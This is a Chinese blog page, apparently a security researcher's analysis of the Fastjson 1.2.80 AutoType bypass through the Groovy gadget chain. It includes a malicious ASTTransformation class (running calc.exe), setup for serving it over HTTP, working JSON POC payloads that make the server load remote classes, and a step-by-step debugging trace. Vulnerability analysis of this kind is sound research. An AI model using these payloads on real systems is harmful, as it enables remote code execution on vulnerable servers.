@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+    <meta charset="UTF-8">
+    
+    <link rel="apple-touch-icon" sizes="76x76" href="/null">
+    <link rel="icon" type="image/png" href="/null">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <title>Fastjson 1.2.80 分析 - Hexo</title>
+    
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    
+    
+    <meta name="description" content="">
+    <meta name="author" content="John Doe">
+    <meta name="keywords" content="">
+    <style>
+
+
+    
+    :root{
+        --shadow-color: rgba(0,0,0,0.2);
+        --sec-shadow: rgba(0,0,0,0.03);
+        --shadow-hover-color: rgba(0,0,0,0.28);
+        --first-text-color: #475b6d;
+        --second-text-color: #37475b;
+        --third-text-color: #858585;
+        --default-text-color: #505050;
+        --default-link-color: #007bff;
+        --link-color: #000000;
+        --second-link-color: #4F9BFA;
+        --code-color:rgba(27,31,35,.05);
+        --post-bkg-color: #fff;
+        --page-bkg-color: #f2f5f8;
+        --nav-a-hover-color: #3498db;
+        --post-sec-text-color: #718096;
+        --sec-bkg: #f2f5f8;
+        --color-mode: 'light';
+        --bkg-h: rgba(255,255,255,0.6);
+        --bkg-m: #e1e4e8;
+        --home-title-color: #4169E1;
+        --shadow: 0 4px 10px rgba(0,2,4,0.06),0 0 1px rgba(0,2,4,0.11);
+        --hr-color: #ddd;
+        --bg-t: #f4f4f4;
+        --nav-bkg: rgba(255,255,255,0.6);
+    }
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-mode: 'dark';
+  }
+
+  :root:not([data-theme]) {
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+  }
+}
+
+[data-theme='dark'] {
+    --shadow-color: rgba(0,0,0,0.2);
+    --shadow-hover-color: rgba(0,0,0,0.28);
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+}
+
+</style>
+
+
+
+<style>
+#page-main,footer,.p-btn{
+    display: none;
+}
+html,body{
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    overflow-y: overlay;
+}
+body{
+    background-color: var(--page-bkg-color);
+    color: var(--second-text-color);
+    overflow-y: scroll;
+}
+a {
+    color: var(--default-link-color);
+    text-decoration: none;
+    background-color: transparent;
+}
+a:hover{
+    color: var(--second-link-color);
+}
+.main-content,.post-card-main{
+    margin: 30px;
+}
+
+
+
+@media (max-width: 410px){
+    .post-card-main{
+        max-width: 350px!important;
+    }
+}
+
+@media (max-width: 980px){
+    .post-card-main{
+        max-width: 520px!important;
+    }
+}
+
+
+@media (min-width: 780px){ 
+    h3{
+        font-size: 1.5rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 1280px){ 
+    h3{
+        font-size: 1.7rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 2096px){ 
+    h3{
+        font-size: 1.8rem;
+        line-height: 1.5em;
+    }
+}
+
+.text-center{
+    text-align: center!important;
+}
+.middle-center{
+    display: -webkit-box;
+    display: -ms-flexbox;
+    display: flex;
+    -webkit-box-align: center;
+    -ms-flex-align: center;
+    align-items: center;
+    -webkit-box-pack: center;
+    -ms-flex-pack: center;
+    justify-content: center;
+    height: 100%;
+}
+header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: fixed;
+    height: 54px;
+    padding: 0 1.25rem;
+    top: 0;
+    left: 0;
+    right: 0;
+    z-index: 10;
+    border-bottom: 1px solid var(--bkg-m);
+    background-color: var(--nav-bkg);
+}
+header .header__left, header .header__right {
+    display: flex;
+    align-items: center;
+    font-family: rubik,sans-serif,Varela Round;
+}
+header .header__left .logo__text {
+    font-size: 18px;
+    font-weight: 450;
+    padding: 14.5px 10px;
+    border-radius: 5px;
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus {
+    height: 54px;
+    padding: 0 0 0 15px;
+}
+header .header__right .button {
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus .navbar-menu {
+    display: inline-block;
+    align-items: center;
+    height: 54px;
+    padding: 0 10px;
+    font-size: 16px;
+    line-height: 54px;
+}
+header .header__right .dropdown-icon {
+    display: none;
+    height: 54px;
+    padding: 15px 10px;
+    border: 0;
+    background-color: transparent;
+}
+header .header__right .dropdown-menus {
+    line-height: 2rem;
+    animation: slide-in .15s ease 1;
+    display: none;
+    position: absolute;
+    left: 12px;
+    right: 12px;
+    top: calc(54px + 10px);
+    border-radius: 6px;
+    padding: 24px;
+    background-color: var(--page-bkg-color);
+    border: 1px solid var(--bkg-m);
+    z-index: 9999;
+    justify-items: center;
+    justify-content: center;
+    flex-direction: column;
+}
+header .header__right #btn-search, header .header__right #btn-toggle-dark{
+    display: inline-block;
+    padding:  18px 10px;
+    height: 25px;
+}
+header .header__right #btn-dropdown{
+  display: inline-block;
+  padding:  13.5px 0;
+}
+header .header__right .dropdown-menus .dropdown-menu {
+    padding: 10px;
+    color: var(--second-text-color);
+}
+@media screen and (max-width: 764px){
+.navbar__menus {
+    display: none!important;
+}
+.dropdown-icon {
+    display: inline-block!important;
+}
+}
+.p-btn{
+    position: fixed;
+    bottom: 1.2rem;
+    right: 1.2rem;
+    contain: layout;
+}
+.toc-btn,.click-btn{
+    cursor: pointer;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    align-items: center;
+    margin-top: .5rem;
+    font-size: .75rem;
+    background-color: var(--sec-bkg);
+    display: block;
+    padding: 0.9rem;
+    box-shadow: 0 0.3rem 0.6rem rgba(48,55,66,.15);
+    border: none;
+    border-radius: 0.5rem;
+    line-height: 1;
+    color: var(--first-text-color);
+}
+.toc-link{
+    color: var(--second-text-color);
+}
+
+#css-loading h3{
+    font-weight: 500;
+    font-size: 1.4rem;
+    text-align: center;
+    position: fixed;
+    top: 200px;
+    left: 0;
+    right: 0;
+    opacity: 0;
+    animation: cssLoad;
+    animation-delay: 0.3s;
+    -webkit-animation: cssLoad;
+    -webkit-animation-delay: 0.3s;
+}
+@keyframes cssLoad {
+    from {
+        opacity: 0;
+    }
+    to {
+        opacity: 0.9;
+    }
+}
+
+
+.memorial {
+    -webkit-filter: grayscale(100%);
+    -moz-filter: grayscale(100%);
+    -ms-filter: grayscale(100%);
+    -o-filter: grayscale(100%);
+    filter: grayscale(100%);
+    filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); filter:gray;
+}
+
+
+    .post-copyright:after {
+        position: absolute;
+        color: #fff;
+        background: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 496 512'%3E%3Cpath fill='gray' d='M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z'/%3E%3C/svg%3E");
+        content: ' ';
+        height: 10rem;
+        width: 10rem;
+        right: -2rem;
+        top: -2rem;
+        opacity: .1;
+    }
+
+</style>
+
+    
+
+    
+        <!--
+        <link rel="stylesheet" href="/css/page.css" media="print"
+            onload="this.media='all';this.onload=null">
+        <noscript>-->
+            <link rel="stylesheet" href="/css/page.css">
+        <!--</noscript>-->
+    
+    
+    <link rel="stylesheet" href="/css/main.css" media="print" onload="this.media='all';this.onload=null">
+    <noscript>
+        <link rel="stylesheet" href="/css/main.css">
+    </noscript>
+
+    
+    <script src="/js/main.js"></script>
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <body>
+        <header>
+            
+<div class="header__left">
+	<a href="/" class="button"><span class="logo__text">blckder02</span></a>
+</div>
+<div class="header__right">
+	<div class="navbar__menus">
+		
+		<a href="/" class="button">
+			<div class="navbar-menu">首页</div>
+		</a>
+		
+		<a href="/archives/" class="button">
+			<div class="navbar-menu">归档</div>
+		</a>
+		
+		<a href="/categories/" class="button">
+			<div class="navbar-menu">分类</div>
+		</a>
+		
+		<a href="/about/" class="button">
+			<div class="navbar-menu">关于</div>
+		</a>
+		
+	</div>
+	
+	<a href="/search/" class="button">
+		<div id="btn-search">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32">
+				<path
+					d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z">
+				</path>
+			</svg>
+		</div>
+	</a>
+	
+	<a href="javaScript:void(0);" class="button" id="btn-toggle-dark">
+		<div>
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none"
+				stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+				<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+			</svg>
+		</div>
+	</a>
+	<a href="javaScript:void(0);" class="dropdown-icon button">
+		<div id="btn-dropdown">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32" stroke-linecap="round">
+				<path
+					d="M903.43 561.52H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 204.31H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 918.73H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24z"
+					fill="currentColor"></path>
+			</svg>
+		</div>
+	</a>
+	<div class="dropdown-menus" id="dropdown-menus">
+		
+		<a href="/" class="dropdown-menu button">首页</a>
+		<br>
+		
+		<a href="/archives/" class="dropdown-menu button">归档</a>
+		<br>
+		
+		<a href="/categories/" class="dropdown-menu button">分类</a>
+		<br>
+		
+		<a href="/about/" class="dropdown-menu button">关于</a>
+		<br>
+		
+	</div>
+</div>
+
+        </header>
+        <div id="top"></div>
+        <div id="page-main" class="main-content">
+        <div class="mg-top">
+            
+
+<article class="page">
+<div id="post-meta-m">
+    <div class="post-meta" id="post-meta">
+  <h3>Fastjson 1.2.80 分析</h3>
+    
+      <span class="post-meta-label">
+        John Doe
+      </span>
+    
+    
+      <span class="post-meta-label">
+        <span class="p-dot"></span>
+        <time datetime="2022-09-26 19:30" pubdate>
+          2022-09-26
+        </time>
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        共 3.9k 字
+      </span>
+    
+    
+    
+  </div>
+  
+</div>
+<div class="article-m">
+  <div class="post-toc">
+    
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Groovy"><span class="toc-number">2.</span> <span class="toc-text">Groovy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-%E8%B0%83%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text">POC 调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jython-spring-context-postgresql"><span class="toc-number">3.</span> <span class="toc-text">jython+spring-context+postgresql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="toc-number">3.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-%E8%B0%83%E8%AF%95-1"><span class="toc-number">3.3.</span> <span class="toc-text">POC 调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#aspectj-%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">aspectj 读文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-2"><span class="toc-number">4.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-%E8%B0%83%E8%AF%95-2"><span class="toc-number">4.3.</span> <span class="toc-text">POC 调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">补丁分析</span></a></li></ol>
+    
+  </div>
+    <div id="article">
+      <div id="post-content" class="markdown-body textretty">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该漏洞由<strong>浅蓝</strong>研究发现，可在特定条件下绕过 AutoType 关闭限制加载远程对象进行反序列化。</p>
+<p><strong>影响版本：</strong> 特定依赖存在下影响 ≤1.2.80。</p>
+<p>漏洞公告：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/security_update_20220523">https://github.com/alibaba/fastjson/wiki/security_update_20220523</a></p>
+<h2 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li>Fastjson 1.2.80</li>
+<li>Groovy 3.0.8</li>
+<li>JDK 8u12</li>
+<li>在 <code>pom.xml</code>中导入依赖：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.80<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>构造恶意类，要有<code>@GroovyASTTransformation</code>注解，并且实现<code>ASTTransformation</code>接口；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.ASTNode;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.SourceUnit;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.transform.ASTTransformation;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.transform.GroovyASTTransformation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GroovyASTTransformation</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CalcCmd</span> <span class="keyword">implements</span> <span class="title class_">ASTTransformation</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(ASTNode[] astNodes, SourceUnit sourceUnit)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>起一个服务端，把恶意类的 class 文件放到根目录下，再创建一个<code>META-INF/services/org.codehaus.groovy.transform.ASTTransformation</code>文件，在文件中写入恶意类的名称；<br><code>python -m http.server 8081</code><br><img src="/./images/1663838395916.png" alt="enter description here"></p>
+<p>POC，<code>classpathList</code>为远程服务端地址；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_80</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.CompilationFailedException\&quot;,\&quot;unit\&quot;:&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.ProcessingUnit\&quot;,\&quot;@type\&quot;:\&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\&quot;,\&quot;config\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.CompilerConfiguration\&quot;,\&quot;classpathList\&quot;:\&quot;http://127.0.0.1:8081/\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">obj1</span> <span class="operator">=</span> JSON.parseObject(poc1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">obj2</span> <span class="operator">=</span> JSON.parseObject(poc2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>命令执行成功；<br><img src="/./images/1663838568516.png" alt="enter description here"></p>
+<h3 id="POC-调试"><a href="#POC-调试" class="headerlink" title="POC 调试"></a>POC 调试</h3><p>在<code>parseObject()</code>中获取到第一个<code>@type</code>字段中的类名，带入<code>checkAutoType()</code>；<br><img src="/./images/1663726943359.png" alt="enter description here"></p>
+<p>从<code>mapping</code>中获取到了 clazz，然后返回<code>java.lang.Exception</code>；<br><img src="/./images/1663727204534.png" alt="enter description here"></p>
+<p>因为<code>java.lang.Exception</code>是继承 Throwable 类的，所以获取到的是<code>ThrowableDeserializer</code>类型的<code>deserializer</code>；<br>这里目的是要利用<code>ThrowableDeserializer.deserializer()</code>中调用的<code>checkAutoType()</code>方法中第二个参数不为 null ，和 1.2.68 版本的绕过原理一样；<br><img src="/./images/1663817434587.png" alt="enter description here"></p>
+<p>跟进<code>deserialze()</code>，获取到第二个<code>@type</code>字段中的类名，带入<code>checkAutoType()</code>；<br><img src="/./images/1663727962513.png" alt="enter description here"></p>
+<p>跟进，<code>expectClass</code>参数值为<code>Throwable.class</code>，所以<code>expectClassFlag</code>赋为 true；<br><img src="/./images/1663728129987.png" alt="enter description here"></p>
+<p>然后进行黑名单校验，<code>CompilationFailedException</code>不在黑名单中，能顺利通过校验；<br><img src="/./images/1663728283393.png" alt="enter description here"></p>
+<p>因为<code>expectClassFlag</code>为 true， 所以在1185 行加载了<code>CompilationFailedException</code>，可以绕过后面对 AutoType 的校验，并且 1190 行把它添加进了 mapping；<br><img src="/./images/1663728557491.png" alt="enter description here"></p>
+<p>跟进到<code>ThrowableDeserializer.deserialze()</code>，调用了<code>cast()</code>，成员变量类型是<code>ProcessingUnit</code>；<br><img src="/./images/1663729964248.png" alt="enter description here"></p>
+<p>跟进<code>TypeUtils.cast()</code>，调用<code>castToJavaBean()</code>;<br><img src="/./images/1663730274503.png" alt="enter description here"></p>
+<p>获取到<code>JavaBeanDeserializer</code>类型的<code>deserializer</code>；<br><img src="/./images/1663730477650.png" alt="enter description here"></p>
+<p>获取到<code>deserializer</code>之后，把<code>org.codehaus.groovy.control.ProcessingUnit</code> put 进了<code>this.deserializers</code>，这是后面绕过 AutoType 校验的关键！<br><img src="/./images/1663818998276.png" alt="enter description here"></p>
+<p>1195 行进行实例化，实例化的结果是 null ；<br><img src="/./images/1663730917411.png" alt="enter description here"></p>
+<p>返回 null 值，调用<code>setValue()</code>进行赋值，由于值为 null ，抛出异常；<br><img src="/./images/1663731007182.png" alt="enter description here"></p>
+<p>然后进入 POC 的 catch 分支，反序列化 poc2。</p>
+<p>获取到第一个<code>@type</code>字段，带入<code>checkAutoType()</code>；<br><img src="/./images/1663731327910.png" alt="enter description here"></p>
+<p>因为前面 把<code>ProcessingUnit</code> put 进<code>this.deserializers</code>了，所以这里可以直接从<code>this.deserializers</code>中找到<code>ProcessingUnit</code>，返回 clazz；<br><img src="/./images/1663731498323.png" alt="enter description here"></p>
+<p>获取到<code>JavaBeanDeserializer</code>类型的<code>deserializer</code>，调用<code>deserialze()</code>；<br><img src="/./images/1663731732636.png" alt="enter description here"></p>
+<p><code>ref</code>是第二个<code>@type</code>值<code>JavaStubCompilationUnit</code>，<code>expectClass</code>是<code>ProcessingUnit</code>类，带入<code>checkAutoType()</code>；<br><img src="/./images/1663732314205.png" alt="enter description here"></p>
+<p>跟进，<code>expectClassFlag</code>为true，在 1185 行加载<code>JavaStubCompilationUnit</code>，并且将它添加进 mapping；<br><img src="/./images/1663732619823.png" alt="enter description here"></p>
+<p>调用<code>JavaBeanDeserializer.deserialze()</code>；<br><img src="/./images/1663735912701.png" alt="enter description here"></p>
+<p>跟进调用了<code>parseField()</code>；<br><img src="/./images/1663826576316.png" alt="enter description here"></p>
+<p>跟进调用了<code>deserialze()</code>，返回的<code>value</code>是 CompilerConfiguration 类型，并且把传入的远程地址赋给了<code>classpath</code>；<br><img src="/./images/1663827014225.png" alt="enter description here"></p>
+<p>117 行又把整个 CompilerConfiguration 对象赋给<code>JavaStubCompilationUnit</code>的<code>config</code>参数；<br><img src="/./images/1663827198684.png" alt="enter description here"></p>
+<p>在 982 行的 for 循环中，从<code>fieldValues</code>中获取参数值存入<code>params[]</code>中，因为我们值给<code>config</code>传了值，所以<code>params[]</code>只有一个参数值；<br><img src="/./images/1663827420393.png" alt="enter description here"></p>
+<p>1044 行 new 了一个<code>JavaStubCompilationUnit</code>对象；<br><img src="/./images/1663827642773.png" alt="enter description here"></p>
+<p>JavaStubCompilationUnit 的构造方法有三个参数，第一个参数是我们自定义的，第二个参数是调用<code>setClassLoader()</code>获取的，第三个参数是 null；<br><code>setClassLoader()</code>中 new 了 GroovyClassLoader 对象；<br><img src="/./images/1663828441275.png" alt="enter description here"></p>
+<p>跟到<code>GroovyClassLoader</code>的构造方法，从<code>config</code>中获取<code>classpath</code>添加进<code>GroovyClassLoader</code>对象；<br><img src="/./images/1663827835330.png" alt="enter description here"></p>
+<p>返回到<code>CompilationUnit</code>构造方法，184 行调用了<code>addPhaseOperations()</code>，跟进再调用了<code>ASTTransformationVisitor.addPhaseOperations()</code> ；<br><img src="/./images/1663828966569.png" alt="enter description here"></p>
+<p>跟进<code>addGlobalTransforms()</code> -&gt; <code>doAddGlobalTransforms()</code>，<code>transformLoader</code>是从<code>JavaStubCompilationUnit</code>对象中获取到的<code>GroovyClassLoader</code>；<br>使用<code>getResource()</code>从加载器中获取<code>META-INF/services/org.codehaus.groovy.transform.ASTTransformation</code>文件下的资源<br><img src="/./images/1663829149367.png" alt="enter description here"></p>
+<p>跟进<code>getResource()</code>，可以看到，加载资源遵循双亲委派型，会首先委托父类加载器，委托到启动类加载器时，会从 Bootstrap classpath 对应的 jar 包或目录中加载资源；<br><img src="/./images/1663830359777.png" alt="enter description here"></p>
+<p><code>getBootstrapClassPath()</code>最终获取到的时<code>bcp</code>字段的值，也就是说从<code>bcp</code>中的 jar 包中加载资源；<br><img src="/./images/1663830953349.png" alt="enter description here"></p>
+<p>然后调用<code>findResources()</code>，跟进，再调用<code>ucp</code>的<code>findResources()</code>，<code>ucp</code>是 URLClassPath 类型，一共会调用三次<code>ucp.findResources()</code>，每次的<code>ucp</code>都不一样；<br><img src="/./images/1663831978025.png" alt="enter description here"></p>
+<p><img src="/./images/1663832905820.png" alt="enter description here"></p>
+<p><img src="/./images/1663832914608.png" alt="enter description here"></p>
+<p>因为每次的类加载器不一样，所以 ucp 不一样，第三次是从远程地址<code>http://127.0.0.1:8081/</code>加载资源；<br><img src="/./images/1663834234712.png" alt="enter description here"></p>
+<p>资源加载进来后，就开始逐行读取每个资源的内容，把不以<code>#</code>开头的行放到<code>transformNames</code>中；<br><img src="/./images/1663834813436.png" alt="enter description here"></p>
+<p>循环到第三次<code>globalServices</code>时，<code>transformNames</code>中已经有四个值了；<br><img src="/./images/1663834990074.png" alt="enter description here"></p>
